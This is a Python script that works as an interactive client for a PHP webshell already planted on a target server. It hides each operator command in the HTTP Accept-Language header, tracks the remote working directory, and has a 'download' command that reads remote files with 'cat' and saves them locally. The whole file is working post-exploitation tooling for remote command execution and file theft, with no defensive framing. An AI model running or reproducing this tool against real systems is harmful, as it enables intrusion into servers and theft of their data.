import requests
import os
from colorama import *
import platform
import argparse
'''
    TODO:Cleanup code
'''
init()

url = ""
cmd = ""
send = ""
cwd = "/"


parser = argparse.ArgumentParser()
parser.add_argument("-u","--url", help="path to php webshell")
args = parser.parse_args()
if args.url:
    url = args.url
else:
    parser.print_help()
    exit()
print("[+]Enjoy your shell!")

while(cmd != "exit"):
    print(Style.BRIGHT + Fore.GREEN + "wefir",end="")
    print("@",end="")
    print("shell",end="")
    print(Fore.WHITE+":"+ Fore.CYAN +"~",end="")
    print(Style.BRIGHT+Fore.MAGENTA + cwd+Style.RESET_ALL+Fore.RESET+"$",end="")
    cmd = input()
    cmd_arr = cmd.split(" ")
    if cmd == "clear" or cmd == "cls":
        if platform.system == 'Windows':
            os.system("cls")
        elif platform.system == 'Linux':
            os.system("clear")

    if "download" in cmd_arr:
        to_download = cmd_arr[cmd_arr.index("download") + 1]
        cmd = "cat " + to_download
        send = "cd " + cwd + ";" + cmd 
        headers = {"Accept-Language": send}
        r = requests.get(url,headers=headers)
        print("[+]Downloading "+to_download)
        f = open(to_download,"wb")
        f.write(r.content)
        f.close()
        print("[+]Done.Saved To ./"+to_download)
    else:
        send = "cd " + cwd + ";" + cmd +";echo;pwd"
        headers = {"Accept-Language": send}
        r = requests.get(url,headers=headers)


        output = r.text.split('\n')
        o = len(output)
        
        cwd = output[o-2]
        
        for i in range(o-2):
            print(output[i])
    
